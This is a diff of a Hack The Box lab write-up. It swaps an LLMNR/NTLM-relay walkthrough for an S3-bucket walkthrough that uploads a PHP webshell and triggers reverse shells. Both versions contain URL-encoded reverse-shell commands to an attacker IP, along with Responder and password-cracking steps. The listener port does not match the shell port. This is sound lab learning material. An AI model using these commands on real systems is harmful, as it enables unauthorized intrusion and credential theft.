@@ -1,48 +1,42 @@
 # Overview
 **Difficulty:** Very Easy  
-**Skills:** RFI, responder, ntlm-relay, password cracking, winrm  
+**Skills:** subdomain discovery, aws cli, webshell, remote code execution
 **HTB Link:** https://app.hackthebox.com/starting-point  
-**Summary:** Capture NTLM via LLMNR/NetBIOS poisoning and RFI, crack NTLM hash, log to WinRM to obtain admin shell.
+**Summary:** Discovered an S3-hosted web entry, uploaded a PHP webshell and triggered a reverse shell to gain foothold.
 
 ---
 
 # Steps
 
-# reconnaissance
-## nmap scan
+## 1. reconnaissance
+**port scan**
 - [nmap scan](./evidences/nmap.txt)
 - OpenSSH 7.6p1 22/tcp
 - Apache web server on port 80/tcp
 
-## hostname
-- thetoppers.htb
+**subdomain discovery**
+- [ffuf fuzzing](./evidences/ffuf.txt)
+- s3 bucket subdomain
 
-## ffuf fuzzing
-- 
+**aws s3 ls**
+- [aws s3 ls](./evidences/aws_ls.png)
+- aws configure (with random values)
+- aws --endpoint=http://s3.thetoppers.htb s3 ls
+- aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
 
-# resource development
-## responder tool
-- [NTLM hash](./evidences/ntlm_hash.png)
-- responder -I tun0
-- listening on the interface connected to the LAN of the target for LLMNR (Link Local Multicast Neighbor Resolution)
-- so that we can get the username and HASH (MD4) used to authenticate via NTLM
+## 2. resource development
+**php script**
+- [php script](./shell.php)
+- aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
+- upload to webpage php script to execute code to server
+**listening socket**
+- nc -nvlp 9000
+- this socket will get the reverse shell
 
-# initial access
-## remote-file-intrusion
-- [RFI command](./evidences/remote_file_intrusion.png)
-- index.php?page=//10.10.14.78/test
-- the responder logs are stored in: /usr/share/responder/log
-- the hash inside the log is saved inside [NTLM hash] (./evidences/hash.txt)
-http://thetoppers.htb/shell.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.121%2F9001%200%3E%261
+## 3. initial access
+**remote code execution**
+- http://thetoppers.htb/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.14.121%209001%20%3E%2Ftmp%2Ff
+- we execute the reverse shell and gain access to the system
+- cat /var/www/flag.txt
 
-## hash crack
-- [NTLM hash cracked](./evidences/hash_cracking.png)
-- john --wordlist=/usr/share/wordlist/seclists/Passwords/Leaked-Databases/rockyou-75.txt ./evidences/hash.txt
-
-## WinRM access
-- [WinRM shell access](./evidences/WinRM_access.png)
-- evil-winrm -i unika.htb -u Administrator -p badminton
-
-# privilege escalation
-- [root flag](./evidences/root_flag.png)
-- cat C:\Users\mike\Desktop\flag.txt
+## 4. privilege escalation
